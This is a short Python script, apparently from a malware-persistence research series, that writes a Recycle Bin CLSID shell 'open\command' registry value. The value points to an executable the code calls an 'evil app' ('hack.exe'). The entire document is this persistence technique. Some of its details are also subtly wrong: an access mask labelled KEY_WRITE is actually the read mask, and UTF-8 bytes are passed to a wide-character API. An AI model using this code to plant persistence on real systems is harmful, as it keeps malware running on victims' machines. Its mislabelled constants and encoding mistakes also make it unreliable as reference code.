import ctypes

# shell
shell = "SOFTWARE\\Classes\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell"

# evil app
exe = "C:\\Users\\IEUser\\Desktop\\research\\2023-01-20-malware-pers-21\\hack.exe".encode('utf-8')

# open registry key
hkey = ctypes.c_void_p()
res = ctypes.windll.advapi32.RegOpenKeyExW(
    ctypes.c_uint32(0x80000002), # HKEY_LOCAL_MACHINE
    shell,
    0,
    0x00020019, # KEY_WRITE
    ctypes.byref(hkey)
)

if res == 0:
    # create sub-key
    hkR = ctypes.c_void_p()
    res = ctypes.windll.advapi32.RegCreateKeyExW(
        hkey,
        "open\\command",
        0,
        None,
        0, # REG_OPTION_NON_VOLATILE
        0x000f003f, # KEY_ALL_ACCESS
        None,
        ctypes.byref(hkR),
        None
    )

    if res == 0:
        # set registry key value
        res = ctypes.windll.advapi32.RegSetValueExW(
            hkR,
            None,
            0,
            1, # REG_SZ
            exe,
            len(exe)
        )
        ctypes.windll.advapi32.RegCloseKey(hkR)
    ctypes.windll.advapi32.RegCloseKey(hkey)